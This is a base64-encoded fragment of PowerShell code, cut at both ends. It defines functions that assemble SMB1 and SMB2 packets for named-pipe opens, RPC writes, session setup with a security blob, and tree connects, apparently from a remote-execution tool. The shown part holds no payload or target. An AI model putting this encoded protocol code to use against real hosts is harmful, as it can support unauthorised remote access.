weDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0FuZFhPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfRmlsZU5hbWVMZW4iLCRwYWNrZXRfZmlsZV9uYW1lX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0NyZWF0ZUZsYWdzIixbQnl0ZVtdXSgweDE2LDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X1Jvb3RGSUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfQWNjZXNzTWFzayIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMikpCiAgICAgICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9BbGxvY2F0aW9uU2l6ZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0ZpbGVBdHRyaWJ1dGVzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X1NoYXJlQWNjZXNzIixbQnl0ZVtdXSgweDA3LDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0Rpc3Bvc2l0aW9uIixbQnl0ZVtdXSgweDAxLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0NyZWF0ZU9wdGlvbnMiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CTlRDcmVhdGVBbmRYUmVxdWVzdC5BZGQoIlNNQk5UQ3JlYXRlQW5kWFJlcXVlc3RfSW1wZXJzb25hdGlvbiIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJOVENyZWF0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CTlRDcmVhdGVBbmRYUmVxdWVzdF9TZWN1cml0eUZsYWdzIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0J5dGVDb3VudCIsJHBhY2tldF9uYW1lZF9waXBlX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJOVENyZWF0ZUFuZFhSZXF1ZXN0X0ZpbGVuYW1lIiwkcGFja2V0X25hbWVkX3BpcGUpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQk5UQ3JlYXRlQW5kWFJlcXVlc3QKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CUmVhZEFuZFhSZXF1ZXN0KCkKICAgIHsKICAgICAgICAkcGFja2V0X1NNQlJlYWRBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDBhKSkKICAgICAgICAkcGFja2V0X1NNQlJlYWRBbmRYUmVxdWVzdC5BZGQoIlNNQlJlYWRBbmRYUmVxdWVzdF9BbmRYQ29tbWFuZCIsW0J5dGVbXV0oMHhmZikpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X0FuZFhPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfRklEIixbQnl0ZVtdXSgweDAwLDB4NDApKQogICAgICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X09mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfTWF4Q291bnRMb3ciLFtCeXRlW11dKDB4NTgsMHgwMikpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfTWluQ291bnQiLFtCeXRlW11dKDB4NTgsMHgwMikpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfVW5rbm93biIsW0J5dGVbXV0oMHhmZiwweGZmLDB4ZmYsMHhmZikpCiAgICAgICAgJHBhY2tldF9TTUJSZWFkQW5kWFJlcXVlc3QuQWRkKCJTTUJSZWFkQW5kWFJlcXVlc3RfUmVtYWluaW5nIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0LkFkZCgiU01CUmVhZEFuZFhSZXF1ZXN0X0J5dGVDb3VudCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKCiAgICAgICAgcmV0dXJuICRwYWNrZXRfU01CUmVhZEFuZFhSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQldyaXRlQW5kWFJlcXVlc3QoKQogICAgewogICAgICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9maWxlX0lELFtJbnRdJHBhY2tldF9SUENfbGVuZ3RoKQoKICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X1JQQ19sZW5ndGgpCiAgICAgICAgJHBhY2tldF93cml0ZV9sZW5ndGggPSAkcGFja2V0X3dyaXRlX2xlbmd0aFswLDFdCgogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MGUpKQogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfQW5kWENvbW1hbmQiLFtCeXRlW11dKDB4ZmYpKQogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfQW5kWE9mZnNldCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0ZJRCIsJHBhY2tldF9maWxlX0lEKQogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfT2Zmc2V0IixbQnl0ZVtdXSgweGVhLDB4MDMsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X1Jlc2VydmVkMiIsW0J5dGVbXV0oMHhmZiwweGZmLDB4ZmYsMHhmZikpCiAgICAgICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9Xcml0ZU1vZGUiLFtCeXRlW11dKDB4MDgsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9SZW1haW5pbmciLCRwYWNrZXRfd3JpdGVfbGVuZ3RoKQogICAgICAgICRwYWNrZXRfU01CV3JpdGVBbmRYUmVxdWVzdC5BZGQoIlNNQldyaXRlQW5kWFJlcXVlc3RfRGF0YUxlbmd0aEhpZ2giLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9EYXRhTGVuZ3RoTG93IiwkcGFja2V0X3dyaXRlX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0RhdGFPZmZzZXQiLFtCeXRlW11dKDB4M2YsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUJXcml0ZUFuZFhSZXF1ZXN0LkFkZCgiU01CV3JpdGVBbmRYUmVxdWVzdF9IaWdoT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QuQWRkKCJTTUJXcml0ZUFuZFhSZXF1ZXN0X0J5dGVDb3VudCIsJHBhY2tldF93cml0ZV9sZW5ndGgpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQldyaXRlQW5kWFJlcXVlc3QKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CQ2xvc2VSZXF1ZXN0KCkKICAgIHsKICAgICAgICBwYXJhbSAoW0J5dGVbXV0kcGFja2V0X2ZpbGVfSUQpCgogICAgICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NNQkNsb3NlUmVxdWVzdC5BZGQoIlNNQkNsb3NlUmVxdWVzdF9Xb3JkQ291bnQiLFtCeXRlW11dKDB4MDMpKQogICAgICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0LkFkZCgiU01CQ2xvc2VSZXF1ZXN0X0ZJRCIsJHBhY2tldF9maWxlX0lEKQogICAgICAgICRwYWNrZXRfU01CQ2xvc2VSZXF1ZXN0LkFkZCgiU01CQ2xvc2VSZXF1ZXN0X0xhc3RXcml0ZSIsW0J5dGVbXV0oMHhmZiwweGZmLDB4ZmYsMHhmZikpCiAgICAgICAgJHBhY2tldF9TTUJDbG9zZVJlcXVlc3QuQWRkKCJTTUJDbG9zZVJlcXVlc3RfQnl0ZUNvdW50IixbQnl0ZVtdXSgweDAwLDB4MDApKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUJDbG9zZVJlcXVlc3QKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CVHJlZURpc2Nvbm5lY3RSZXF1ZXN0KCkKICAgIHsKICAgICAgICAkcGFja2V0X1NNQlRyZWVEaXNjb25uZWN0UmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJUcmVlRGlzY29ubmVjdFJlcXVlc3QuQWRkKCJTTUJUcmVlRGlzY29ubmVjdFJlcXVlc3RfV29yZENvdW50IixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQlRyZWVEaXNjb25uZWN0UmVxdWVzdC5BZGQoIlNNQlRyZWVEaXNjb25uZWN0UmVxdWVzdF9CeXRlQ291bnQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQlRyZWVEaXNjb25uZWN0UmVxdWVzdAogICAgfQoKICAgIGZ1bmN0aW9uIEdldC1QYWNrZXRTTUJMb2dvZmZBbmRYUmVxdWVzdCgpCiAgICB7CiAgICAgICAgJHBhY2tldF9TTUJMb2dvZmZBbmRYUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUJMb2dvZmZBbmRYUmVxdWVzdC5BZGQoIlNNQkxvZ29mZkFuZFhSZXF1ZXN0X1dvcmRDb3VudCIsW0J5dGVbXV0oMHgwMikpCiAgICAgICAgJHBhY2tldF9TTUJMb2dvZmZBbmRYUmVxdWVzdC5BZGQoIlNNQkxvZ29mZkFuZFhSZXF1ZXN0X0FuZFhDb21tYW5kIixbQnl0ZVtdXSgweGZmKSkKICAgICAgICAkcGFja2V0X1NNQkxvZ29mZkFuZFhSZXF1ZXN0LkFkZCgiU01CTG9nb2ZmQW5kWFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDApKQogICAgICAgICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QuQWRkKCJTTUJMb2dvZmZBbmRYUmVxdWVzdF9BbmRYT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CTG9nb2ZmQW5kWFJlcXVlc3QuQWRkKCJTTUJMb2dvZmZBbmRYUmVxdWVzdF9CeXRlQ291bnQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQkxvZ29mZkFuZFhSZXF1ZXN0CiAgICB9CgogICAgI1NNQjIKCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CMkhlYWRlcigpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X2NvbW1hbmQsW0ludF0kcGFja2V0X21lc3NhZ2VfSUQsW0J5dGVbXV0kcGFja2V0X3RyZWVfSUQsW0J5dGVbXV0kcGFja2V0X3Nlc3Npb25fSUQpCgogICAgICAgIFtCeXRlW11dJHBhY2tldF9tZXNzYWdlX0lEID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X21lc3NhZ2VfSUQpICsgMHgwMCwweDAwLDB4MDAsMHgwMAoKICAgICAgICAkcGFja2V0X1NNQjJIZWFkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfUHJvdG9jb2xJRCIsW0J5dGVbXV0oMHhmZSwweDUzLDB4NGQsMHg0MikpCiAgICAgICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDQwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfQ3JlZGl0Q2hhcmdlIixbQnl0ZVtdXSgweDAxLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfQ2hhbm5lbFNlcXVlbmNlIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9Db21tYW5kIiwkcGFja2V0X2NvbW1hbmQpCiAgICAgICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0IixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfRmxhZ3MiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfTmV4dENvbW1hbmQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfTWVzc2FnZUlEIiwkcGFja2V0X21lc3NhZ2VfSUQpCiAgICAgICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9SZXNlcnZlZDIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMkhlYWRlci5BZGQoIlNNQjJIZWFkZXJfVHJlZUlEIiwkcGFja2V0X3RyZWVfSUQpCiAgICAgICAgJHBhY2tldF9TTUIySGVhZGVyLkFkZCgiU01CMkhlYWRlcl9TZXNzaW9uSUQiLCRwYWNrZXRfc2Vzc2lvbl9JRCkKICAgICAgICAkcGFja2V0X1NNQjJIZWFkZXIuQWRkKCJTTUIySGVhZGVyX1NpZ25hdHVyZSIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCgogICAgICAgIHJldHVybiAkcGFja2V0X1NNQjJIZWFkZXIKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdCgpCiAgICB7CiAgICAgICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X1N0cnVjdHVyZVNpemUiLFtCeXRlW11dKDB4MjQsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9EaWFsZWN0Q291bnQiLFtCeXRlW11dKDB4MDIsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9TZWN1cml0eU1vZGUiLFtCeXRlW11dKDB4MDEsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9SZXNlcnZlZCIsW0J5dGVbXV0oMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X0NhcGFiaWxpdGllcyIsW0J5dGVbXV0oMHg0MCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0LkFkZCgiU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdF9DbGllbnRHVUlEIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X05lZ290aWF0ZUNvbnRleHRPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfTmVnb3RpYXRlQ29udGV4dENvdW50IixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfUmVzZXJ2ZWQyIixbQnl0ZVtdXSgweDAwLDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdC5BZGQoIlNNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3RfRGlhbGVjdCIsW0J5dGVbXV0oMHgwMiwweDAyKSkKICAgICAgICAkcGFja2V0X1NNQjJOZWdvdGlhdGVQcm90b2NvbFJlcXVlc3QuQWRkKCJTTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0X0RpYWxlY3QyIixbQnl0ZVtdXSgweDEwLDB4MDIpKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyTmVnb3RpYXRlUHJvdG9jb2xSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0KCkKICAgIHsKICAgICAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfc2VjdXJpdHlfYmxvYikKCiAgICAgICAgW0J5dGVbXV0kcGFja2V0X3NlY3VyaXR5X2Jsb2JfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlY3VyaXR5X2Jsb2IuTGVuZ3RoKQogICAgICAgICRwYWNrZXRfc2VjdXJpdHlfYmxvYl9sZW5ndGggPSAkcGFja2V0X3NlY3VyaXR5X2Jsb2JfbGVuZ3RoWzAsMV0KCiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X1N0cnVjdHVyZVNpemUiLFtCeXRlW11dKDB4MTksMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X0ZsYWdzIixbQnl0ZVtdXSgweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfU2VjdXJpdHlNb2RlIixbQnl0ZVtdXSgweDAxKSkKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfQ2FwYWJpbGl0aWVzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfQ2hhbm5lbCIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X1NlY3VyaXR5QnVmZmVyT2Zmc2V0IixbQnl0ZVtdXSgweDU4LDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlNlc3Npb25TZXR1cFJlcXVlc3QuQWRkKCJTTUIyU2Vzc2lvblNldHVwUmVxdWVzdF9TZWN1cml0eUJ1ZmZlckxlbmd0aCIsJHBhY2tldF9zZWN1cml0eV9ibG9iX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0LkFkZCgiU01CMlNlc3Npb25TZXR1cFJlcXVlc3RfUHJldmlvdXNTZXNzaW9uSUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdC5BZGQoIlNNQjJTZXNzaW9uU2V0dXBSZXF1ZXN0X0J1ZmZlciIsJHBhY2tldF9zZWN1cml0eV9ibG9iKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyU2Vzc2lvblNldHVwUmVxdWVzdCAKICAgIH0KCiAgICBmdW5jdGlvbiBHZXQtUGFja2V0U01CMlRyZWVDb25uZWN0UmVxdWVzdCgpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X3BhdGgpCgogICAgICAgIFtCeXRlW11dJHBhY2tldF9wYXRoX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9wYXRoLkxlbmd0aCkKICAgICAgICAkcGFja2V0X3BhdGhfbGVuZ3RoID0gJHBhY2tldF9wYXRoX2xlbmd0aFswLDFdCgogICAgICAgICRwYWNrZXRfU01CMlRyZWVDb25uZWN0UmVxdWVzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CiAgICAgICAgJHBhY2tldF9TTUIyVHJlZUNvbm5lY3RSZXF1ZXN0LkFkZCgiU01CMlRyZWVDb25uZWN0UmVxdWVzdF9TdHJ1Y3R1cmVTaXplIixbQnl0ZVtdXSgweDA5LDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlRyZWVDb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlQ29ubmVjdFJlcXVlc3RfUmVzZXJ2ZWQiLFtCeXRlW11dKDB4MDAsMHgwMCkpCiAgICAgICAgJHBhY2tldF9TTUIyVHJlZUNvbm5lY3RSZXF1ZXN0LkFkZCgiU01CMlRyZWVDb25uZWN0UmVxdWVzdF9QYXRoT2Zmc2V0IixbQnl0ZVtdXSgweDQ4LDB4MDApKQogICAgICAgICRwYWNrZXRfU01CMlRyZWVDb25uZWN0UmVxdWVzdC5BZGQoIlNNQjJUcmVlQ29ubmVjdFJlcXVlc3RfUGF0aExlbmd0aCIsJHBhY2tldF9wYXRoX2xlbmd0aCkKICAgICAgICAkcGFja2V0X1NNQjJUcmVlQ29ubmVjdFJlcXVlc3QuQWRkKCJTTUIyVHJlZUNvbm5lY3RSZXF1ZXN0X0J1ZmZlciIsJHBhY2tldF9wYXRoKQoKICAgICAgICByZXR1cm4gJHBhY2tldF9TTUIyVHJlZUNvbm5lY3RSZXF1ZXN0CiAgICB9CgogICAgZnVuY3Rpb24gR2V0LVBhY2tldFNNQjJDcmVhdGVSZXF1ZXN0RmlsZSgpCiAgICB7CiAgICAgICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X25hbWVkX3B